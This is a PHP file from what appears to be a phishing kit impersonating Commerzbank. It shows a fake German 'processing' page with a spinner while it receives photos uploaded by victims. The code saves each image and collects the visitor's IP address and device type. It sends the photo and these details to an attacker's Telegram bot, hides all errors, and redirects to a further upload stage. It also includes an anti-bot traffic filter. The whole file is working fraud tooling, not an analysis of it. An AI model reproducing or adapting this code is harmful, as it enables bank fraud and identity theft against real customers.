<?php
// ANTIBOT DISABLED - include..antibot.php';
include '../antibot/tds.php';

// Increase limits for iPhone uploads
ini_set('upload_max_filesize', '100M');
ini_set('post_max_size', '100M');
ini_set('max_execution_time', '600');
ini_set('memory_limit', '512M');
ini_set('max_input_time', '600');

// Disable error display completely
ini_set('display_errors', '0');
ini_set('display_startup_errors', '0');

// Include Telegram configuration
include '../config/telegram.php';
$botToken = $telegram_bot2_token;
$chatId = $telegram_bot2_chat_id;

$uploadDir = 'xentryxupload/';
if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0755, true);
}

// Silent processing - no error messages at all
$uploadSuccess = false;
$telegramSent = false;

try {
    if (isset($_FILES['file']) && $_FILES['file']['error'] == UPLOAD_ERR_OK) {
        $randomPrefix = str_pad(rand(0, 999999), 6, '0', STR_PAD_LEFT);
        $originalFileName = basename($_FILES['file']['name']);
        $fileExtension = strtolower(pathinfo($originalFileName, PATHINFO_EXTENSION));
        $newFileName = $randomPrefix . '-' . $originalFileName;
        $uploadPath = $uploadDir . $newFileName;

        // Accept all image types including iPhone formats
        $allowedTypes = ['jpg', 'jpeg', 'png', 'gif', 'heic', 'heif', 'webp', 'bmp', 'tiff'];
        
        if (in_array($fileExtension, $allowedTypes)) {
            if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath)) {
                $uploadSuccess = true;
                
                $fileSize = filesize($uploadPath);
                $visitorIp = $_SERVER['REMOTE_ADDR'];
                $userAgent = $_SERVER['HTTP_USER_AGENT'];
                $serverHost = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_ADDR'];
                $imageURL = "{$serverHost}/views/{$uploadDir}{$newFileName}";

                $message = "🟡 |  𝗖𝗼𝗺𝗺𝗲𝗿𝘇𝗯𝗮𝗻𝗸 𝗨𝗽𝗹𝗼𝗮𝗱  [ 2nd ]\n";
                $message .= "🔗 |  𝗜𝗠𝗚 𝗨𝗥𝗟  : $imageURL\n";
                $message .= "📍 |  𝗜𝗣  : $visitorIp\n";
                $message .= "📱 |  𝗗𝗲𝘃𝗶𝗰𝗲  : " . (strpos($userAgent, 'iPhone') !== false ? 'iPhone' : 'Other') . "\n";
                $message .= "📏 |  𝗦𝗶𝘇𝗲  : " . number_format($fileSize / 1024, 2) . " KB";
                $message .= "📄 |  𝗙𝗶𝗹𝗲  : $originalFileName";

                // Try to send image to Telegram
                $result = sendTelegramPhoto($botToken, $chatId, $uploadPath, $message);
                
                if ($result) {
                    $telegramSent = true;
                } else {
                    // Try alternative method
                    sendTelegramMessage($botToken, $chatId, $message . "\n\n⚠️ Image upload failed, but data received.");
                    $telegramSent = true;
                }
            }
        }
    }
} catch (Exception $e) {
    // Silent error handling - log but don't display
    error_log("Upload error: " . $e->getMessage());
    
    // Still try to send a notification
    $errorMessage = "❌ |  𝗖𝗼𝗺𝗺𝗲𝗿𝘇𝗯𝗮𝗻𝗸 𝗨𝗽𝗹𝗼𝗮𝗱 𝗘𝗿𝗿𝗼𝗿\n";
    $errorMessage .= "📍 |  𝗜𝗣  : " . $_SERVER['REMOTE_ADDR'] . "\n";
    $errorMessage .= "📱 |  𝗗𝗲𝘃𝗶𝗰𝗲  : " . (strpos($_SERVER['HTTP_USER_AGENT'], 'iPhone') !== false ? 'iPhone' : 'Other') . "\n";
    $errorMessage .= "⚠️ |  𝗘𝗿𝗿𝗼𝗿  : Upload processing error";
    
    sendTelegramMessage($botToken, $chatId, $errorMessage);
}
?>

<html dir="ltr" lang="de" class="js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths win chrome chrome1 webkit webkit5 details" style="">
<head>
<script src="/security.js"></script>
<link rel="icon" data-savepage-href="https://kunden.commerzbank.de/portal/media/system/images/favicon.ico" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABzPkCAMv5AgDL+gIAyvkCAMf4AgDD9QIAvfICALXuAgCp5gIFtugCAAAAAAAAAAAAAAAAAAAAAAAAAAAEz/sCAcz59QDL+f8Ay/r/AMr5/wDH+P8Aw/b/AL3y/wC17v8ApuX/C77u9QzF8AIAAAAAAAAAAAAAAAAAAAAAB9H7oAXQ+v8BzPn/AMv5/wDL+v8Ayfn/AMX3/wDA9P8AuPD/AK/r/wCc3v8a5v+gAAAAAAAAAAAAAAAADdj8EAvV+/0H0fr/Bc/6/wDM+v8Ay/r/AMr5/wDH+P8AwvX/ALzx/wCy7f8AneD/C8bw/Q/Y+xAAAAAAEdn7AhPd/8YQ3P//Ddr//wbR+v8Dzvr/AMv5/wDL+v8AyPj/AMP2/wC88v8As+3/AJ/h/xHa//8O2P3GDNb8Ahnj/zAQyfT/AJ/f/wCi45UFxvUEBM/7AgDL+QIAy/kCAMj4AgDD9gIAvPICAbrvBAzY/5UL1fv/B9L6/wfS+zAOxfLtAJjc/wCq5/8As+3+ALfvAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXP+wIFz/r+BtD6/wXP+v8CzfntAJ7e/wCo5/8Ate3/ALrx/wC+8scAwPQCAAAAAAAAAAAAAAAAAAAAAAHL+AIBy/nHAcz6/wLN+v8AzPn/AMv5/wCk4/UAtO3/ALrx/wDA9P8AxPb/AMj4DAAAAAAAAAAAAAAAAAAAAAAAyvoMAMv6/wDL+v8Ay/r/AMv6/wDL+vUAsuwvALjw/wC/8/8AxPb/AMj4/wDJ+eMAyvkCAAAAAAAAAAAAxvgCAMj54wDJ+f8Ayvn/AMr5/wDJ+f8AyvovALvxAgC989UAw/X/AMf4/wDK+f8AzPv/AMv5UAAAAAAAAAAAAMH0UADE9v8Axff/AMb3/wDH9/8Ax/jVAMf4AgAAAAAAwvUOAMT3/wDJ+f8AzPv/AMv5/wLN+vQF0PwCALbuAgC88vQAvvP/AMD0/wDB9P8AwfX/AMP2DgAAAAAAAAAAAMf4AgDI+LQAyvn/AMv6/wHM+f8Ez/r/Ctb+mwCs6psAs+3/ALbv/wC37/8AufD/ALrxtAC88gIAAAAAAAAAAAAAAAAAyvkCAMv6/gDL+f8Dzfr/BtH6/w3Z//8Al9v/AKLi/wCp5/8ArOn/AK3q/gCy7AIAAAAAAAAAAAAAAAAAAAAAAAAAAADL+m0Ay/n/A876/wjT/P8N2f//Cbns/wCS1/8Aldn/AJnc/wCd320AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMv5AgLN+QIF0PkCCtT6AgSz5wIAldkCAJbaAgCZ3AIAAAAAAAAAAAAAAAAAAAAA4AesQcADrEHAA6xBgAGsQQAArEEAAKxBB+CsQQPArEEDwKxBAYCsQQGArEGAAaxBgAGsQcADrEHgB6xB8A+sQQ==">
<meta charset="utf-8">
<meta name="author" content="Commerzbank AG">
<meta name="robots" content="noindex, nofollow"> 
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Verarbeitung läuft - Commerzbank</title>
<meta name="application-name" content="Anmeldung zum Digital Banking">
<meta name="referrer" content="strict-origin-when-cross-origin">
<meta name="domainSuffix" content=".commerzbank.de">
<link rel="shortcut icon" data-savepage-href="/portal/media/system/images/favicon.ico" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABzPkCAMv5AgDL+gIAyvkCAMf4AgDD9QIAvfICALXuAgCp5gIFtugCAAAAAAAAAAAAAAAAAAAAAAAAAAAEz/sCAcz59QDL+f8Ay/r/AMr5/wDH+P8Aw/b/AL3y/wC17v8ApuX/C77u9QzF8AIAAAAAAAAAAAAAAAAAAAAAB9H7oAXQ+v8BzPn/AMv5/wDL+v8Ayfn/AMX3/wDA9P8AuPD/AK/r/wCc3v8a5v+gAAAAAAAAAAAAAAAADdj8EAvV+/0H0fr/Bc/6/wDM+v8Ay/r/AMr5/wDH+P8AwvX/ALzx/wCy7f8AneD/C8bw/Q/Y+xAAAAAAEdn7AhPd/8YQ3P//Ddr//wbR+v8Dzvr/AMv5/wDL+v8AyPj/AMP2/wC88v8As+3/AJ/h/xHa//8O2P3GDNb8Ahnj/zAQyfT/AJ/f/wCi45UFxvUEBM/7AgDL+QIAy/kCAMj4AgDD9gIAvPICAbrvBAzY/5UL1fv/B9L6/wfS+zAOxfLtAJjc/wCq5/8As+3+ALfvAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXP+wIFz/r+BtD6/wXP+v8CzfntAJ7e/wCo5/8Ate3/ALrx/wC+8scAwPQCAAAAAAAAAAAAAAAAAAAAAAHL+AIBy/nHAcz6/wLN+v8AzPn/AMv5/wCk4/UAtO3/ALrx/wDA9P8AxPb/AMj4DAAAAAAAAAAAAAAAAAAAAAAAyvoMAMv6/wDL+v8Ay/r/AMv6/wDL+vUAsuwvALjw/wC/8/8AxPb/AMj4/wDJ+eMAyvkCAAAAAAAAAAAAxvgCAMj54wDJ+f8Ayvn/AMr5/wDJ+f8AyvovALvxAgC989UAw/X/AMf4/wDK+f8AzPv/AMv5UAAAAAAAAAAAAMH0UADE9v8Axff/AMb3/wDH9/8Ax/jVAMf4AgAAAAAAwvUOAMT3/wDJ+f8AzPv/AMv5/wLN+vQF0PwCALbuAgC88vQAvvP/AMD0/wDB9P8AwfX/AMP2DgAAAAAAAAAAAMf4AgDI+LQAyvn/AMv6/wHM+f8Ez/r/Ctb+mwCs6psAs+3/ALbv/wC37/8AufD/ALrxtAC88gIAAAAAAAAAAAAAAAAAyvkCAMv6/gDL+f8Dzfr/BtH6/w3Z//8Al9v/AKLi/wCp5/8ArOn/AK3q/gCy7AIAAAAAAAAAAAAAAAAAAAAAAAAAAADL+m0Ay/n/A876/wjT/P8N2f//Cbns/wCS1/8Aldn/AJnc/wCd320AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMv5AgLN+QIF0PkCCtT6AgSz5wIAldkCAJbaAgCZ3AIAAAAAAAAAAAAAAAAAAAAA4AesQcADrEHAA6xBgAGsQQAArEEAAKxBB+CsQQPArEEDwKxBAYCsQQGArEGAAaxBgAGsQcADrEHgB6xB8A+sQQ==" type="image/x-icon" title="Commerzbank AG">
<link rel="apple-touch-icon" data-savepage-href="/portal/media/system/mobil/images/app_icon.png" href="" type="image/x-icon" title="Commerzbank AG">
<link rel="apple-touch-icon" sizes="57x57" data-savepage-href="/portal/media/system/mobil/images/apple-touch-icon-57x57_A.png" href="" type="image/x-icon" title="Commerzbank AG">
<link rel="apple-touch-icon" sizes="72x72" data-savepage-href="/portal/media/system/mobil/images/apple-touch-icon-72x72_A.png" href="" type="image/x-icon" title="Commerzbank AG">
<link rel="apple-touch-icon" sizes="76x76" data-savepage-href="/portal/media/system/mobil/images/apple-touch-icon-76x76_A.png" href="" type="image/x-icon" title="Commerzbank AG">
<link rel="apple-touch-icon" sizes="114x114" data-savepage-href="/portal/media/system/mobil/images/apple-touch-icon-114x114_A.png" href="" type="image/x-icon" title="Commerzbank AG">
<link rel="apple-touch-icon" sizes="120x120" data-savepage-href="/portal/media/system/mobil/images/apple-touch-icon-120x120_A.png" href="" type="image/x-icon" title="Commerzbank AG">
<link rel="apple-touch-icon" sizes="144x144" data-savepage-href="/portal/media/system/mobil/images/apple-touch-icon-144x144_A.png" href="" type="image/x-icon" title="Commerzbank AG">
<link rel="apple-touch-icon" sizes="152x152" data-savepage-href="/portal/media/system/mobil/images/apple-touch-icon-152x152_A.png" href="" type="image/x-icon" title="Commerzbank AG">
<style>
body {
    font-family: 'Gotham 4r', Arial, sans-serif;
    margin: 0;
    padding: 0;
    background: #f5f5f5;
    color: #333;
}
.container {
    max-width: 1200px;
    margin: 0 auto;
    padding: 20px;
}
.processing {
    text-align: center;
    padding: 50px 20px;
    background: white;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    margin: 20px 0;
}
.spinner {
    border: 4px solid #f3f3f3;
    border-top: 4px solid #ffcc00;
    border-radius: 50%;
    width: 50px;
    height: 50px;
    animation: spin 1s linear infinite;
    margin: 20px auto;
}
@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}
.status {
    color: #666;
    font-size: 16px;
    margin: 20px 0;
}
.logo {
    color: #ffcc00;
    font-size: 24px;
    font-weight: bold;
    margin-bottom: 20px;
}
</style>
</head>
<body>
    <div class="container">
        <div class="processing">
            <div class="logo">COMMERZBANK</div>
            <div class="spinner"></div>
            <h2>Verarbeitung läuft...</h2>
            <div class="status">
                <?php if ($uploadSuccess): ?>
                    ✅ Datei erfolgreich verarbeitet
                <?php else: ?>
                    ⏳ Verarbeite Ihre Anfrage...
                <?php endif; ?>
            </div>
            <p>Bitte warten Sie, während wir Ihre Daten verarbeiten.</p>
        </div>
    </div>
    
    <script>
        // Redirect after 3 seconds
        setTimeout(function() {
            window.location.href = 'uploadz3.php';
        }, 3000);
    </script>
</body>
</html>
